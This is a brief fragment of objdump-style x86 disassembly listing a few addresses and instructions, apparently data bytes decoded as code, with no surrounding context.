  428edf:	add    BYTE PTR [esp+ecx*4+0x2],dh
  428ee3:	add    BYTE PTR [esp+ecx*4-0x736bfffe],al
  428eea:	add    al,BYTE PTR [eax]
  428eec:	mov    ds:0xba00028c,al
  428ef1:	mov    WORD PTR [edx],es
  428ef3:	add    ah,al
  428ef5:	mov    WORD PTR [edx],es
  428ef7:	add    al,dl
  428ef9:	mov    WORD PTR [edx],es
  428efb:	add    dh,bl
  428efd:	mov    WORD PTR [edx],es
  428eff:	add    BYTE PTR [eax],al
  428f01:	add    BYTE PTR [eax],al
	...
